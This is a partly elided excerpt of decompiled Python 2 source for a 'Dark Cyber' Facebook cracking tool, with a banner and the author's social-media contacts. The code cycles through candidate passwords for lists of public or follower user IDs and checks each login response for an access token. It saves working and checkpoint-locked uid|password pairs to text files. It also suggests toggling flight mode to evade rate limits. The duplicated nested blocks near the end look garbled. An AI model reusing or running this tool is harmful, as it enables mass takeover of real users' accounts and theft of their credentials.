# Decompile by Dark Cyber (Tools By Younis John)
# Time Succes decompile : 2022-05-29 21:16:42.305263
# Github - https://github.com/Younis John
...
______________________________________________________
 ...
 [*] WhatsApp  : +88013188058**
 [*] FACEBOOK  : MD ARMAN HOSSAIN  
 [*] GITHUB    : arman3
...
def main():
    os.system('clear')
    print logo
    print ' \t [\x1b[1;97m\x1b[1;41m   Welcome To DARK CYBER TOOL  \x1b[0m\x1b[1;93m]'.center(50)
    print 54 * '\x1b[1;93m_'
    print ''
    ...
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    os.system('xdg-open https://facebook.com/groups/4705492769518536/')
    main_select()
...
def main_select():
    ...
    if SYED == '':
        ...
        os.system('xdg-open https://www.facebook.com/DarkCyberOfficial')
        main()
    elif SYED == '4':
        os.system('xdg-open https://facebook.com/groups/4705492769518536/')
        main()
...
def crack():
    ...
    print ''
    print 47 * '\x1b[1;93m\xe2\x96\xac'
    print '\x1b[1;93m[1] \x1b[1;92mCRACK FROM PUBLIC ID     \x1b[1;91m[ 3 Numeric ]\n'
    print '\x1b[1;93m[2] \x1b[1;92mCRACK FROM FOLLOWERS ID  \x1b[1;91m[ 3 Numeric ]\n'
...
def crack_select():
    ...
    print 54 * '_'
    print ''
    print '[\x1b[1;97m\x1b[1;41m 4G Speed If No Result Flight Mode On/Off \x1b[0m\x1b[1;93m]'
    print 54 * '\x1b[1;93m_'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[DARKCYBER-ID-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('Syedok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[DARKCYBER-ID-CP] ' + uid + ' | ' + pass1 + ' | ' + name
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[DARKCYBER-ID-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('Syedok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[DARKCYBER-ID-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('Syedcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[DARKCYBER-ID-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('Syedok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[DARKCYBER-ID-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('Syedcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[DARK-CYBER-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Syedok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[DARK-CYBER-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[DARKCYBER-ID-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('Syedok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[DARKCYBER-ID-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('Syedcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[DARKCYBER-ID-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('Syedok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[DARKCYBER-ID-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('Syedcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[DARKCYBER-ID-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('Syedok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[DARKCYBER-ID-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('Syedcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
            ...
            if 'access_token' in q:
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[DARKCYBER-ID-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('Syedok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[DARKCYBER-ID-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('Syedcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
